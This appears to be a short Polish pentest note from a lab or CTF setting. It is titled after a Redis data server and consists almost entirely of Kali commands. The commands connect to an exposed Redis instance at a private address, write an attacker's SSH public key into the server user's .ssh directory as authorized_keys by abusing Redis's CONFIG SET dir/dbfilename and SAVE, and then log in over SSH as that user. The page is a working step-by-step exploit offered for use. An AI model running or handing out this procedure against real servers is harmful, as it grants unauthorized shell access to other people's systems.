---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# serwer danych redis

**Kali**

{% code fullWidth="true" %}
```python
apt install redis-tools

#łaczymy się z serwerem
redis-cli -h 172.15.0.11
```
{% endcode %}

{% code overflow="wrap" fullWidth="true" %}
```python
#generowanie kluczy uwierzytelniających
ssh-keygen -t rsa -b 2048

#dodajemy dwie puste linijki nad kluczem i pod nim
vim id_rsa.pub

#przekazujemy nasz klucz do serwera redis
cat id_rsa.pub | redis-cli -h 172.15.0.11 -x set keyvalue

#podgląd klucza z serwera redis
redis-cli -h 172.15.0.11
get keyvalue

#wskazujemy katalog do którego będziemy zapisywali backupy - tu znajdują się klucze publiczne użytkowników do logowania się
config set dir /home/cheesus/.ssh/

#wskazujemy plik do backupu
config set dbfilename "authorized_keys"
save

#logowanie się na serwer
ssh -i ./id_rsa cheesus@172.15.0.11
```
{% endcode %}
